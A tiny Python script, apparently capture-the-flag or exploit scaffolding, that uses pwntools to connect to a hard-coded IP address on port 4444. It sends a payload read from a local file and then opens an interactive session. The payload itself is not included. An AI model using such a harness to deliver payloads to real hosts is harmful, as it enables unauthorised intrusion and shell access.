from pwn import *

r = remote("158.178.227.224", 4444)

with open("payload.txt", "r") as f:
    payload = f.read().strip()

r.send(payload.encode())
r.interactive()